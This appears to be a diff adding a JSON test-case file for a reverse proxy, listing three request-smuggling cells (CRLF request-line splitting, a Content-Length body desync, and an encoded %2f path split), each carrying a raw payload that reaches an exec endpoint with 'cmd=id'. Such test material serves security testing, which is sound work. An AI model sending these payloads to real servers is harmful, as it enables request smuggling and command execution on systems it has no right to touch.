@@ -1,0 +1,53 @@
+{
+  "dialect": "ngx",
+  "build": "44bf7f35",
+  "prefix": "/api",
+  "cells": [
+    {
+      "family": "request_line_split",
+      "build": "44bf7f35",
+      "dialect": "ngx",
+      "source": "r14A",
+      "poc": "ev_r14_A_probe2.py",
+      "shape": "GET with %0d%0a in the query; upstream receives a second, 4-token request",
+      "expect": "exec",
+      "steps": [
+        {
+          "name": "attack",
+          "path": "/api/x?a%0d%0aGET%20/exec%3fcmd=id%0d%0aHost:%20u%0d%0a%20HTTP/1.1"
+        }
+      ]
+    },
+    {
+      "family": "body_replay_desync",
+      "build": "44bf7f35",
+      "dialect": "ngx",
+      "source": "r14A",
+      "poc": "ev_r14_A_probe2.py",
+      "shape": "CL parsed but body never forwarded; tail re-parsed as the next request",
+      "expect": "exec",
+      "steps": [
+        {
+          "name": "attack",
+          "raw": "POST /api/x HTTP/1.1\r\nHost: alpha.test\r\nContent-Length: 70\r\nConnection: keep-alive\r\n\r\nGET /api/exec?cmd=id HTTP/1.1\r\nHost: alpha.test\r\nConnection: close\r\n\r\n"
+        }
+      ]
+    },
+    {
+      "family": "pct2f_split",
+      "build": "44bf7f35",
+      "dialect": "ngx",
+      "source": "r14A",
+      "poc": "ev_r14_A_probe2.py",
+      "shape": "GET /api/%2fexec%3fcmd=id; the proxy emits a decoded 3-token exec target",
+      "expect": "exec",
+      "steps": [
+        {
+          "name": "attack",
+          "path": "/api/%2fexec%3fcmd=id"
+        }
+      ]
+    }
+  ],
+  "pass_uri": "/api"
+}
